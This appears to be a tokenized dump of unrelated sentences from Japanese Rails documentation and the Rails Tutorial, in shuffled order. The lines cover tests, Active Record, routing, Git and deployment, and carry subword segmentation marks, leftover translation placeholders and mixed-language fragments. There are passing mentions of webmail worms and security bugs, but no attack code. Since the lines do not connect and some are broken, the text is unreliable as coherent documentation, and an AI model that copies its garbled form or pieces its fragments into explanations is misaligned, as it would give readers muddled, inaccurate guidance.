▁ テストが 失敗した 時に 、 テスト 失敗 の 道 筋 を アプリケーション 全体 に わ た って た ど る スタック ト レ ー ス ▁( バ ッ ク ト レ ー ス ) ▁ が表示されます 。
▁Active ▁Record ▁ の基礎
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / helpers / sessions _ helper _ test ▖ rb
▁#< Client ▁id : ▁2 19 , ▁first _ name : ▁" J a me s "> ,
▁それでは 最初に 、 必要となる \ k ode { remember \_ digest } 属性を User モデル に追加します ▁( 図 \ ref { fig : user _ model _ remember _ digest }) 。
▁ これはリスト \ ref { code : generated _ user _ fixtures } で使用されていました 。
▁ 無効な 情報 が 送信された 場合 、 更新 の結果 として \ k ode { false } が返され 、\ k ode { else } に 分 岐 して 編集 ページを レンダリング します 。
▁ どちらの web mail ワーム も メールアドレスを 収 集 すること を 目的 と し ており 、 犯罪 的 ハ ッ カ ー が 不 正 な 収 入 を得る の に 使われ る ことがあります 。
▁また 、 ▁\ k ode { assert _ no _ difference } メソッドの ブロック 内で \ k ode { post } 関数 を使い 、 メソッドの 引数に は \ k ode { ’ User ▖ count ’} を与え ています ▟ これは 、 ▁\ k ode { assert _ no _ difference } の ブロック を実行する 前 後で 引数 の値 ▁(\ k ode { User ▖ count }) ▁ が 変 わ らない ことを テスト しています 。
▁<%= ▁link _ to ▁" an ▁article ", ▁@ article , ▁remote : ▁true ▁%>
▁ すると 、 以下のような エラーが表示され ます 。
▁ スコープ
▁ 何らかの 理由 で スコープ をすべて 解除 したい場合は ` unscope d ` メソッド を使用できます 。
▁< strong > Comment : </ strong >
▁次に 学ぶ べ き こと
▁ ジョブ を実行する
▁\ k ode { {1} 第 3 章 {/1} } で示した とおり 、 {2} home {/2} アクションは Web ページ を表示する ための もの であり 、 値 を返す ための もの ではありません でした 。
▁\ emph { Rails チュートリアル } は Web 開発 のための 本 であり 、 Web デザイン の 本 ではありません が 、 だ から と い って \ emph { 何 の スタイル も ない } 寒 々 しい 外 観 の アプリケーションで い つ まで も 作業を 続けて い ると 憂鬱 になってしまいます ▟ そこで 、 この章 では レイアウト に いくつかの 構造 と CSS を与え て 最小限 の スタイル を追加します ▟ カスタム CSS ルール の他に 、 Twitter 社 による オープンソース の Web デザイン フレームワーク である \ href { http :// get bootstrap ▖ com /}{ \ emph { Bootstrap } } を 利用 します 。
▁create ▁app / controllers / users _ controller ▖ rb
▁ alert ▁" The ▁article ▁was ▁delete d ▖ "
▁( なお 、 図 \ ref { fig : user _ model _ sketch } は 草 案 です ▟ 実際の データモデル は 図 \ ref { fig : user _ model _ initial } のようになります ) 。
▁ メールアドレス の 小文字 変換 に対するテスト は 演習 として 残しておきます ▁(\ ref { sec : exercises _ uniqueness _ validation }) 。
▁### ▁form _ for
▁1234567890 12345 6 ▖ to _ s (: human ) ▁# ▁=> ▁" 1▖23 ▁ Q u ad r illion "
▁### ▁ 時間 コンストラクタ
▁\ href { http :// www ▖ rdoc ▖ info / github / j nick la s / carrierwave / CarrierWave / MiniMagick } { MiniMagick の ドキュメント } ▁( 英語 ) ▁ を見ると さまざまな 方法で リ サイズ できる ことがわかります が 、 今回は \ k ode { re size \_ to \_ limit : ▁[ 400 , ▁ 400 ]} という 方法 を使います ▟ これは 、 縦 横 どちら か が 400 p x を 超 え ていた 場合 、 適切な サイズ に 縮 小 する オプション です ▁( ただし 小さい 画像 であっても 拡大 は しません ) 。
▁次に 、\ k ode { followers ▖ include ?} メソッドを使って 先ほど の データモデル を テスト していきます ▟ テストコード は リスト \ ref { code : followers _ test } のとおり です 。
▁これらの メソッド のうち 、` association ` の 部分 は プレースホルダ であり 、` has _ one ` の最初の 引数 である 関連付け 名を シンボル にした もの に置き換えられます 。
▁end
▁ 次のような ことが 順に 発生 します ▟ リクエスト 1 は 、 検証 に パス する ユーザーを メモリ ー 上に 作成します ▟ リクエスト 2 でも 同じ ことが 起 きます ▟ リクエスト 1 のユーザー が保存され 、 リクエスト 2 のユーザー も 保存されます 。
▁It ▁failed ▖
▁ / home / ubuntu / workspace / sample _ app /
▁* ▁ クラス メソッドは 「 self ▖ method 」 よりも 「 class ▁<< ▁self 」 が望ましい 。
▁上の 説明 で 気付いた方もいると思います が 、2 番目の \ k ode { return } は 実は なくても か ま いません ▟ 関数 中 の最後 に置かれ た 式 ▁( この場合は ▁\ k ode {" The ▁string ▁is ▁nonempty ▖ " }) ▁ は 、\ k ode { return } キーワード が なくても 暗 黙 で 値 を返す ためです ▟ ここでは 、 両方 に \ k ode { return } を使用する 方が 見た 目 の 対 称 性 が 保 た れる ので 好 ま しい と 言えます 。
▁* = ▁require _ tree ▁ ▖
▁<%= ▁text _ field ▁: person , ▁: email _ confirmation ▁%>
▁ 実 質 的に 世界 中の あらゆる ソフトウェア は 、 壊 れ ている か 使い にくい か のどちら か だ 。
▁この パーシャル は ユーザー表示ページ と Home ページ の両方 に表示される ので 、 リスト \ ref { code : stats _ partial } の最初の 行 では 、 以下のコード を使用して 適切な 方 を 選択 しています 。
▁config ▖ action _ view ▖ sanitize d _ allow ed _ tags ▁= ▁' table ', ▁' tr ', ▁' td '
▁$ ▁git ▁ checkout ▁- b ▁my _ new _ branch
▁この 最 終 章では 、 本書 の中で 最も 難 易 度 の高い 手法 をいくつか 使用 しています ▟ その中に は 、 ステータスフィード 作成 のために Ruby / SQL を 「 だ ます 」 テクニック も含まれます 。
▁ ところで 、 実際に レイアウト 上に リンク が存在する かどうかを まだ テスト していません が 、 テスト 方法 の ヒント として 、「 名前付きルート が 定義され ていなければ テストは 失敗する 」 という ことに注目してください 。
▁ 名前付きルート ` example _ path ` が 衝 突 している 例を 2 つ 示 します 。
▁変更の結果 、 レイアウトファイル は リスト \ ref { code : application _ layout } のようになります 。
▁# ▁=> ▁100 %
▁WARNING : ▁このオプション を 実際に 使用する 意味 は ほぼ ない と 思 われます 。
▁| ▁ レスポンス クラス ▁| ▁HTTP ステータスコード ▁| ▁ シンボル ▁|
▁ 例 :
▁この 変更 は 、 Rails で コールバック を使用している 多くの 箇所 に 適用 されます ▟ これ には Active ▁Record と Active ▁Model の コールバック や Action ▁Controller の フィルタ ( ` before _ action ` ▁ など ) も含まれます 。
▁### ▁ コントローラ を生成する
▁# ▁Un comment ▁these ▁lines ▁on ▁Windows ▖
▁ こう い う ときの ために 、「 テスト 駆 動 」 に するか 「 一 括 テスト 」 に するか を 決 め る 目 安 となる ガイドライン があると 便利です 。
▁これ を行う ために 、 リスト \ ref { code : follow _ form } の \ k ode { hidden \_ field \_ tag } メソッドを使用します ▟ このメソッドは ▁以下の フォームの HTML を生成します 。
▁app / assets / stylesheets / custom ▖ css ▖ scss
▁ ユーザー表示ページ を変更 した結果 を リスト \ ref { code : user _ show _ with _ sidebar } に示します 。
▁ 同様に 、` before _ remove ` で 例外 が発生し た場合 も 、 オブジェクトは コレクション に 削除 されません 。
▁ 渡された 引数 が ` include ?` に 応答 しない 場合は ` ArgumentError ` 例外が発生します 。
▁# ▁JSON の ルート 要素を デフォルトで 無効 にする
▁Active ▁Support は 、` DateTime ` で 使用できる メソッドの 多く を ` Time ` に追加し ています 。
▁\ k ode { class ▁ UsersController ▁< ▁Application Controller } という 記 法 では 、 Ruby の \ emph { クラス } \ emph { 継 承 } の 文法 をそのまま 使用している ことにご注目ください
▁#### ▁ ミドルウェア を 交 換 する
▁ 何らかの 新しい セッション キー を設定する か 、 すべての セッション を削除する か のどちら か に する必要があります 。
▁* ▁` update _ all `
▁ レイアウト 内で は 、 さまざまな 出力 の 断 片 を 組み合わせ て 最終的な レスポンス 出力 を得る ための 3 つの ツール を 利用できます 。
▁ クラスの 変更 が 複雑な 場合は 、` ActiveSupport :: Concern ` の使用 を ご 検 討 ください 。
▁create ▁app / controllers / microposts _ controller ▖ rb
▁ リレーションシップ / フォロワー に対して \ k ode { belongs \_ to } の関連付け を追加する
▁ これはリスト \ ref { code : log _ out _ with _ forget } で使用されていました 。
▁上の ルーティング によって 、 雑 誌 ▁( magazine ) ▁ への ルーティング に 加えて 、 広 告 ▁( ad ) ▁ を ` A d sController ` に ルーティング すること も できるようになりました 。
▁validates _ each ▁: name , ▁: surname ▁do ▁| record , ▁ attr , ▁value |
▁ 標準的な RESTful のみ を使用している のであれば 、 これ に関する 変更 は 不要 です 。
▁ セッション 機能 ▁(\ ref { sec : sessions _ and _ failed _ login }) ▁ を使用して 、 アカウントの有効化 という 作業を 「 リソース 」 として モデル 化 する ことにします ▟ アカウントの有効化 リソース は Active ▁Record の モデルと はこの 際 関係 ないので 、 両者 を 関連付け ること は しません 。
▁ アップグレード するには 、 単 に ` gem ▁' d all i ' ` を ` Gemfile ` に追加します 。
▁ 接続 プール はデフォルトで は Active ▁Record で 取り 扱 わ れる ため 、 アプリケーション サーバー の動作 は 、 Thin や mong rel や Uni c or n など ど れ であっても 同じ 振る舞い になります 。
▁User モデルに \ k ode { has _ secure _ password } を追加する ▁( ▁\ failing ▁ )
▁ 「 最初から テストを 書 か ない と いけない でしょうか ? 」 も 定 番 の 質 問 です 。
▁ { p 0} では {2} ハッシュ {/2} とは Ruby の データ構造 である と 説明しました が 、 今回の 「 ハッシュ化 」 とは そう い った 構造 ではなく 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hash _ function } { ハッシュ 関数 } を使って 入力 された データを 元に戻 せ ない ▁( 不可 逆 な ) ▁ データ にする 処理 を指します ▟)
▁ データベース 関連の ファイル
▁` secret _ token ▖ rb ` イニシャライザ に記載されている 既存の ▁` secret _ key _ base ` の 秘密キー を取り出し て SE C RE T _ KEY _ BASE 環境変数 に設定し 、 Rails アプリケーションを production モード で 実行する すべての ユーザーが 秘密キー の 恩恵 を受け られる ようにします 。
▁リスト \ ref { code : signup _ form } のとき は 、 以下のように ユーザー登録フォーム で \ k ode { form \_ for } ヘルパー を使用し 、 ユーザーの インスタンス変数 \ k ode {@ user } を 引数 にとって いました 。
▁ これはリスト \ ref { code : microposts _ controller _ access _ control } で使用されていました 。
▁var ▁= ▁bar
▁| ▁** S u cc ess ** ▁| ▁200 ▁| ▁: o k ▁|
▁ そして リスト \ ref { code : users _ fixtures _ extra _ users } と リスト \ ref { code : add _ micropost _ different _ owner } の fixture ファイル から 、 Michael の フィード では L an a と 自分自身 の 投 稿 が 見え て いて 、 A r ch er の 投 稿 は 見え ない ことがわかります 。
▁#### ▁ 開発 の 動 機
▁ Digest :: S HA 2▖ hexdigest ( File ▖ read ( Rails ▖ root ▖ join (' test / fixtures ', ▁path ) ) )
▁その 引数 は 要素 代入 の 右 側 に ひとつ 置かれ ます ▁( ここでは サインイン する ユーザー ) 。
▁ 一方で 、 JavaScript が有効になってい ても 、 まだ 十分 に 対応 でき ていない 部分 があります 。
▁< ▁ コミットメッセージ を 編集 して 、 すべての 変更を わかりやすく 記 述 する ▁>
▁OR DER ▁BY ▁clients ▖ created _ at ▁ desc ")
▁ 期 待 している 動作 が まだ 固 まり き って いない のであれば 、 先に アプリケーションの コードを 書き 上 げ 、 続いて 期 待 する 動作を テストコード で 記 述 すること を 目 指 す 。
▁さらに 、 それぞれの 行 は ユーザー なので 、 これらの ユーザーに 名前 や パスワード などの 属性 も 追加する 必要がある でしょう 。
▁ 結果 として 、\ ref { sec : production _ webserver } で アプリケーションの デプロイ が 終 わ ると 、 自動的に SSL が 有効化 されている はずです ▟ , ▁SSL ▁will ▁automatically ▁be ▁enabled ▖
▁それでは い つ 、 どんな ふ う に テストを 行 えば よい のでしょうか ▟ この 点 を理解する ために 、 テスト を行う \ emph { 目的 } を もう一度 確認し てみましょう ▟ 著者 は 、 テスト には 以下の 3 つ のメリット があると 考え ます 。
▁create ▁app / assets / javascripts / static _ pages ▖ js ▖ coffee
▁ 同様に 、 次に 書く 、 テストにパス する コードの ことを 「 緑色 ▁( Green )」 と 表現 します 。
▁ ミ リ 秒 より 精 度 の 低 い 従来 方 式 に しておきたい 場合は 、 イニシャライザ に 以下 を設定し てください 。
▁Active ▁Record は 、1 つの ` Model ▖ find ` 呼び出し で 関連付けを い く つ でも 一括読み込み することができます ▟ これを行なうには 、` includes ` メソッドで 配列 、 ハッシュ 、 または 、 配列 や ハッシュの ネストした ハッシュ を使用します 。
▁cookies は 、 ある ページ から 別の ページ に移動し た 時に も 破棄され ないので 、 ここに ユーザー ID などの 情報を 保存 できます ▟ アプリケーションは cookies 内の データ を使用して 、 たとえば ログイン 中の ユーザーが 所有 する 情報を データベースから 取り出す ことができます 。
▁JavaScript による 要素 は [ rails ▖ js ]( https :// github ▖ com / rails / jquery - ujs / blo b / master / s r c / rails ▖ js ) であり 、 Ruby による 要素 である 正 規 の ビュー ヘルパー によって DOM に 適切な タグ が追加され ます 。
▁ メールアドレス の 大文字 小文字 を 無視 した 一意性 の検証 ▁( ▁\ passing ▁ )
▁これで ` test _ j db c mysql `、` test _ j db c sqlite 3 `、` test _ j db c postgresql ` も 呼び出され ます 。
▁ _ ポリモーフィック関連付け _ は 、 関連付けの や や 高度な 応用 です 。
▁ 以前 は すべての ヘルパー を い った ん 集 めて から ア ル フ ァ ベ ッ ト 順に ソ ート していました 。
▁Git のインストール 後 、 最初に 1 回 だけ 行う 必要のある 設定 があります 。
▁変更の結果 を リスト \ ref { code : create _ password _ reset } に示します 。
▁( この 注 釈 機能 は 本番 アプリ では 不要な ので 、\ k ode { annotate } ▁gem は \ k ode { group ▁: development } ブロック の中に 書き ます ▁(\ k ode { group ▁: test } に 書いた とき と 同じ要領で す ) ) 。
▁次に \ k ode { bundle ▁install } を実行して インストール します 。
▁ 本番環境 の ユーザー一覧ページ
▁ ログアウト 機能 をテストするために 、 リスト \ ref { code : user _ login _ test _ valid _ information } の ユーザーログイン のテスト に 手順を 若 干 追加します 。
▁format ▖ json ▁do
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁# ▁action _ mailer / test _ case ▖ rb
▁render ▁: edit
▁リスト \ ref { code : typography _ css } を 反 映 した結果 を 図 \ ref { fig : sample _ app _ typography } で 確 認 することができます 。
▁before フィルター ▁(\ k ode { correct _ user }) ▁ を使って 編集 と 更新 を 保 護 する
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁6 ▁assertions , ▁3 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁ それ により 、 上のコード が 各 ア イ テ ム に対して マッチする ように する のが 目的 です
▁ユーザーの \ k ode { show } ページ については 、 今後 も ▁( サインイン している かどうか にかかわらず ) ▁ サイト を 訪 れ た すべての ユーザー から 見え るように しておきます が 、 ユーザー \ k ode { index } ページ は サインイン した ユーザーに しか 見 せ ない ように し 、 未 登録 の ユーザーが デフォルトで 表示 できる ページを 制限 します 。
▁make _ users
▁ いずれ の場合 も 、 指定 できる 値は ` false ` のみ です ▟ ' nil ' など 他の false 値は 指定 できません 。
▁" admin _ user "▖ camelize ▁# ▁=> ▁" Admin User "
▁ 自動的に Spork を使う ための RSpec の設定 。
▁この 風 変 わ り な 文法 \ k ode { ▁[ if ▁ lt ▁ IE ▁ 9 ]} ▁ は 、 Rails の一部 \ emph { ではありません } ▟ これは 実は 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / Conditional _ comment } { 条件 付き コメント } と呼ばれる もの で 、 今回 のような 状 況 のために Internet ▁E x p l or er で 特 別 に サポート されています 。
▁最後に 、\ k ode { formatted \_ email } メソッドを 定義 しましょう ▁(\ ref { sec : string s })▟ このメソッドは 、 文字列 の 式 展開 を利用して 、\ k ode {@ name } と \ k ode {@ email } に割り当てられ た 値を ユーザーの メールアドレス として 構成 します 。
▁╼╼ ▁\ subsection { Heroku の セットアップ } ╼ ▁\ label { sec : heroku _ setup }╼╼
▁これらの コントローラ を ` app / controllers / admin ` ディレクトリに 配置 し 、 ルーティング で これら を グループ 化 できます 。
▁Rails には テスト 環境 ▁(\ text tt { test }) 、 開発環境 ▁(\ text tt { development }) 、 そして 本番環境 ▁(\ text tt { production }) ▁ の 3 つの 環境 が デフォルトで 装 備 されています 。
▁この 時 実行される SQL は以下のような感じ になります 。
▁obtain ing ▁a ▁copy ▁of ▁this ▁software ▁and ▁ associated ▁documentation
▁ 逆に 管理ユーザー には この 削除リンク が表示され 、 この リンクを クリック することで その ユーザーが 管理ユーザー によって 削除され 、\ k ode { User } カウント が \ k ode { - 1 } だけ 変わる ことが 期 待 されます 。
▁ /* ▁header ▁* /
▁このコードは リスト \ ref { code : layout _ login _ logout _ links } で使用されていました ▟ もうひとつ 、
▁ リソース を い く つ も 定義 し なければならない 場合は 、 以下のような 略 記 法 で 一度 に 定義 することで タイプ 量 を 節 約 できます 。
▁" equipment "▖ pluralize ▁# ▁=> ▁" equipment "
▁ 実は 、 これまで 示 した 多くの 例 の中で も 、 クラス を使用して オブジェクト のインスタンス を作成し てきた のですが 、 オブジェクト を作成する ところ を明示的に 説明 していません でした 。
▁<%= ▁pagination _ links ▁%>
▁ アカウント有効化 メイラー メソッド のテスト ▁( リスト \ ref { code : real _ account _ activation _ test }) ▁ の場合と同様 、 パスワード 再設定 用 メイラー メソッドの テストを書く ことにします ▁( リスト \ ref { code : password _ reset _ mailer _ test }) 。
▁この オブジェクトは 、 渡された 属性 を使用して インスタンス化され 、 そのオブジェクト の 外部キー を 介 して リンク が設定され ます ▟ そして 、 関連付けられた モデル で指定されている 検証 がすべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁` deep _ munge ` が 実行 され なかった場合 に 攻撃者 に 利用 される 可能性のある 脆 弱 な コード の例 を以下に示します 。
▁class ▁ Base
▁$ ▁ cd ▁rails
▁### ▁ フ ォ ー ク
▁\ href { http :// dev center ▖ heroku ▖ com / heroku - command } { Heroku の コマンド } は たくさん あるので 、 ここでは 簡単に触れ る 程 度 にとどめ ますが 、 少しだけ 使って みましょう 。
▁ コンテンツ を 名前付き の ` yield ` として レンダリング するには 、` content _ for ` メソッドを使用します 。
▁ 特に 、 個 別 に 指定した ファイルは 、 その とおり の順序 で コンパイル されます 。
▁#### ▁ メールアドレスを 名前 で 表示する
▁`: separator ` を指定する ことで 、 自然な 区切り 位 置 で 切り 詰 め ることができます 。
▁ デフォルトの \ k ode { Guardfile } に 追 記 する 。
▁Bundler では 本番環境 用の gem は インストール しない 設定 に して お いた ので ▁(\ ref { sec : sample _ app _ setup }) 、 リスト \ ref { code : unicorn _ config } は 開発環境 に 影 響 はありません ▟ しかし 、 Bundler に \ k ode { Gemfile ▖ lock } を更新し てもらう 必要がある ので 、 いつものように 次の コマンドを実行 しておきます 。
▁ エンジン と アプリケーションの ルーティング が このように 分 離 されているので 、 アプリケーションの 特定の 部分を エンジンの 特定の 部分 に リンク したい場合は 、 エンジンの ルーティング プロキシ メソッド を使用する必要があります 。
▁self を省略した 結果を リスト \ ref { code : user _ unfollow _ test } に示します 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / conversions ▖ rb ` です 。
▁ これはリスト \ ref { code : branch _ raise } で使用されていました 。
▁config ▖ middleware ▖ delete ▁" Rack :: MethodOverride "
▁このコードは リスト \ ref { code : micropost _ partial _ with _ delete } で使用されていました ▟ もうひとつ 、
▁Active ▁Record には さまざまな 機能 が 搭 載 されており 、 その中で も 以下の もの が 特に 重要です 。
▁上のコードは 、 引数 で 与えられた 文字列を MIME タイプ ` text / javascript ` で ブラウザに送信 します 。
▁ マイグレーション 自体 は 、 データベース に与える 変更を 定義 した \ k ode { change } メソッドの 集 まり です 。
▁WARNING : ▁ コレクション が 空 の場合 、 ルート 要素 はデフォルトで " nil クラス " になります 。
▁render ▁"/ path / to / rails / app / views / books / edit ▖ html ▖ erb "
▁テストにパスする 必要のある 、 リスト { p 0} の {2} update {/2} アクションは 、 リスト \ ref { code : signin _ upon _ signup } に示したように 、 {2} create {/2} アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁しかし 新しい バージョン にも [ 若 干 の セキュリティ バグ ]( http :// www ▖ r or security ▖ info / j our n al / 2008 / 10 /1 3 / new - r ed c lo th - security ▖ html ) がある ため 、 対応策 は 未 だ に 欠 か せ ません 。
▁# ▁config ▖ action _ dispatch ▖ x _ send file _ header ▁= ▁" X - Sendfile " ▁# ▁ Apache 用
▁### ▁ セキュリティ issue の 特殊な 取り 扱 い 方法 について
▁#### ▁stylesheet _ link _ tag
▁Contact ページ で使用する コード
▁ここで 、 {0}{1} 第 2 章 {/1}{/0} の Users コントローラ や Microposts コントローラ とは異なり 、 StaticPages コントローラは 一般的な REST アクションに 対応 していない ことに注意してください 。
▁この 行 では Guard から Spring サーバー を使用して 読み込み 時間 を 短縮 しています ▁( Spring は Rails の 機能 のひとつ です )▟ また 、 開 始 時に テストスイート を フル で 実行 しないよう Guard に 指示 しています 。
▁create ▁app / controllers / blorgh / articles _ controller ▖ rb
▁* ▁` before _ action ` コールバック を使用して mail オブジェクト に デフォルト値 や delivery _ method _ options を与え たり 、 デフォルトの ヘッダ と 添付 を挿入 することもできます 。
▁create ▁test / models / micropost _ test ▖ rb
▁#### # ▁` uniq `
▁ rescue ▁ NameError ▁=> ▁e
▁ 以下を実行して 、 マイグレーション に 図 \ ref { fig : user _ model _ password _ reset } の 属性 を追加します 。
▁ では それ以外の 機能 の実装 に と り か か り ましょう 。
▁この 段階で はほとんど 空 っ ぽ の Rails アプリケーション しか ありません が 、 本番環境 に デプロイ ▁( deploy : ▁ デプロイ ) ▁ し てしまい ましょう 。
▁ これはリスト \ ref { code : generate _ user _ mailer } で使用されていました 。
▁ただし 図 \ ref { fig : invalid _ submission _ no _ feed back } が 示す ように 、( 開発者 用の デバッグ 領 域 を除いて ) ▁ 間違った 送信 を しても 何も フィードバック が 返 って き て いません ▟ これは ユーザーが 困 惑 する 原 因 となります 。
▁ プログラミング 経験 を 重 ね る うちに 、 以下のように 論理値 に応じて 分 岐 する 制御 フ ロー が 実に よく 出 現 すること が すぐに わ か る と思います 。
▁followers
▁ ハ イ ラ イ ト 部分 の最初の 行 ▁( リスト \ ref { code : find _ authenticate _ user }) ▁ では 、 送信された メールアドレス を使用して 、 データベースから ユーザー を取り出し ています
▁ スコープ ブロック 内で は 標準 の [ クエリ メソッド ]( active _ record _ query ing ▖ html ) をすべて 使用できます 。
▁* ▁`: source _ type `
▁ テスト を書いて 、 この問題 に 対 処 しましょう 。
▁` the ruby r hi no ` は J Ruby ユーザー 向 け に 推 奨 されている ランタイム であり 、 J Ruby 環境 下 で はデフォルトで アプリケーションの ` Gemfile ` に追加されます 。
▁Rack 入 門
▁最後に 、\ k ode { formatted _ email } メソッドを 定義 しましょう ▁(\ ref { sec : string s })▟ このメソッドは 、 文字列 の 式 展開 を利用して 、\ k ode {@ name } と \ k ode {@ email } に割り当てられ た 値を ユーザーの メールアドレス として 構成 します 。
▁ リソース ルーティング では 、 関連する さまざまな リクエストを 1 つの コントローラ内の アクションに 割り当て ます 。
▁* ▁ テスト 環境
▁** app / views / layouts / application ▖ html ▖ erb **
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / to _ param ▖ rb ` です 。
▁ 現在の Git ブランチ で 存 分 に コードを書く ことができます ▁( 念のため ` git ▁branch ▁- a ` を実行して 、 正しい ブランチ に い る ことを確認 しておきましょう ) 。
▁最初に Git の コマンドで README の ファイル 形式 を RDoc から Markdown に 変更します 。
▁=> ▁true
▁` object ` オプションは 、 パーシャル で 出力する オブジェクト を直接 指定 したい場合 に 使用します ▟ これは 、 テンプレート の オブジェクトが 他の 場所 ▁( 別の インスタンス変数 や 別の ローカル変数 ) ▁ にある 場合に 便利です 。
▁ 新しい コメント の作成 が完了し たら 、` article _ path (@ article ) ` ヘルパー を使用して 元の 記事 の 画面 に 戻 ります 。
▁この フラグ が true の場合 、 どのような 種類の エラーが発生し た 場合にも 詳細な デバッグ情報 が HTTP レスポンス に 出力 され 、 アプリケーションの 実行 時 コンテキスト が ` Rails :: In fo ` コントローラ によって ` / rails / info / properties ` に 出力 されます 。
▁以下の例 では 、 与えられた ブロック に対して 一度 に 最大 1 000 まで の 納 品 書 ▁( invoice ) ▁ の配列 を yield しています ▟ 最後の ブロック には 残 り の 納 品 書 が含まれます 。
▁( なお 、 これらの \ k ode { count }、\ k ode { empty ?} 、\ k ode { any ?} メソッドは 、 Ruby の配列 に対して も そのまま 使用できます 。
▁NOTE : ▁ メール に 添付 される ファイル は自動的に Base 64 で エンコード されます 。
▁\ k ode { current \_ user } メソッド の目的は 、 以下のような コードを 書 け るように することです 。
▁上のように 宣言 すると 、 キャッシュ 値が 最新の 状態 に 保 た れ 、 次に ` size ` メソッド が呼び出され たときに その 値 が返されます 。
▁#### ▁ メディアタイプ に関する メ モ
▁ この節 の 残 り は 、 この 関数 を完成させ ること に 費 や されます 。
▁ 新しいマイクロポスト を 作成した 直後 の Home ページ
▁ _ user _ objects ▁( end )╼╼ ▁\ subsection { ユーザー オブジェクト を更新する } ▁% ▁( fold )╼ ▁\ label { sec : updating _ user _ objects }╼╼
▁Rails は 、` articles / new ` という テンプレート を アプリケーションの ` app / views ` で 探 そう とします 。
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁class _ name : ▁" G ad get "
▁ 今後 ` users ` テーブル を アプリケーションで 使用 できるように するために 、 ここで ` rake ▁db : migrate ` を実行する 必要があります 。
▁ / users /1 ▁ の URL を有効に するために 、 routes ファイル ▁(\ k ode { config / routes ▖ rb }) に 以下の 1 行 を追加します 。
▁# ▁=> ▁{" " => nil , ▁ "1" =>1 , ▁" N E ST E D "=>{" A " => 3 , ▁"5" => 5}}
▁このメソッド では `: dasherize ` と その 同 族 と同様 の オプション が 使用できます ▟ それらの オプションは ビルダ に 転 送 されます 。
▁ 魔 法 のように 見え ますが 、 これらの コマンドで RVM と Bundler を 統合 できます ▟ そして 、\ k ode { rake } や \ k ode { rspec } などの コマンドを 適切な 環境で 自動的に 実行 してくれます 。
▁Git バージョン管理 を使用している 方は 、 次 に進む前に 変更を マージ して コミット すること を 忘れ ないでください 。
▁ユーザー登録 の 失敗 に 対応 できる \ k ode { create } アクション 。
▁if ▁@ article ▖ save
▁ 項目 ▁( オプション や パラメータ の リスト など ) ▁ と その 説明 は ハイフン で つ な ぐ こと ▟ コロン は シンボル で使用される ので 、 ハイフン の方が 読みやすく なります 。
▁### ▁Action ▁Mailer の設定 例
▁development セクション は以下のようになります 。
▁これは Rails が 、\ k ode { redirect _ to ▁@ user } という コード から \ k ode { user _ url (@ user )} といった コードを 実行 したい ことを ( 自動的に ) 推 察 してくれ た 結果 になります 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁リスト \ ref { code : demo _ gemfile _ sqlite _ version _ redux } の内容は リスト \ ref { code : gemfile _ pg _ gem } と同じ です 。
▁ な ぜ 車輪 の 再 発 明 を する のか 、 という 質 問 がある の も 当 然 です 。
▁ / log /* ▖ log
▁Active ▁Job は 、 ジョブ を 宣言 し 、 それによって バックエンド で さまざまな 方法 による キュー 操作 を実行する ための フレームワーク です 。
▁* ▁` value ` が ` to _ xml ` メソッド に応答する 場合 、`: root ` に キー が 指定 されます 。
▁ 本 項 では 、 無効な 送信 を した ときの 正しい 振る舞い について テストを 書いていきます ▟\ ref { sec : a _ test _ for _ valid _ submission } では 同様の方法で 、 有効な 送信 を した ときの 正しい 振る舞い について テストを 書いていきます 。
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁articles ▁| ▁ ALL ▁| ▁NULL ▁|
▁user ▁= ▁User ▖ find _ by ( name : ▁' David ')
▁* ▁`: last _ word _ connect or `: ▁3 つ 以上の 要素を 接続 する 場合 、 最後の 2 つの 要素 で使用する 接続 詞 を指定します 。
▁ ジェネレータ を実行する には 、 ターミナル を開き 、 Rails ファイルを作成し たい ディレクトリ に移動し て 、 以下 を 入力 します 。
▁### ▁ ページ 変更 イベント
▁create アクション で使用した ` article _ params ` メソッドを ここで も 使う ことにします 。
▁30 2▖2 4 3 9 89 2 34 23 ▖ to _ s (: percentage , ▁ precision : ▁5 )
▁今度は テストが 赤色 ▁( テストが 失敗する ) ▁ になるはずです 。
▁Rails が デフォルトで 作成する ファイル については 表 \ ref { table : rails _ directory _ structure } を参照してください ▟ これらの ファイル や ディレクトリ の 目的 については 本チュートリアル 全体 に 渡 って 説明 いた します 。
▁ 幸 い 、 解決策 の実装 は 簡単です ▟ 実は 、 この問題 は データベース レベルで も 一意性 を強制する だけで 解決 します 。
▁ 特に 今回の 第 3 版 では 、 Cloud 9 と 提 携 して 読者 の 皆 様 に チュートリアル 用に 最適化 された 開発環境 を提供 できた ことを 心 から 嬉 しく 思 っています 。
▁以下の 入力 フィールド に 隠 し 属性 がある ことに注目してください 。
▁development モード は 期待どおり 動作します 。
▁Git で バージョン管理 を している のであれば 、 これまで と同様 、 この時点で 新しい ブランチ を作成する のが よいでしょう 。
▁create ▁app / views / microposts / new ▖ html ▖ erb
▁ 場合によっては ` belongs _ to ` で使用される クエリ を カスタマイズしたくなること があります 。
▁1 つ 前の 章 のとき と同じように 、 サンプルデータを 自動 作成する Rake タスク を使用して 、 データベースに 実際の データを 登録 する のが や は り 便利です 。
▁errors [: name ] ▁= ▁" 以下の 文字 を含む ことはできません ▁ !
▁ セッション のユーザー ID を削除し 、 ブラウザの 永続的 cookies を削除する と 、 アプリケーション から ユーザーが ログアウト します 。
▁` errors ▖ full _ messages ` メソッド または ` errors ▖ to _ a ` メソッドを使用して 、 ユーザーが 実際に 見 ること の できる フォーム 内の メッセージ を 表示 できます 。
▁* ▁Access - Control - Allow - O ri g in
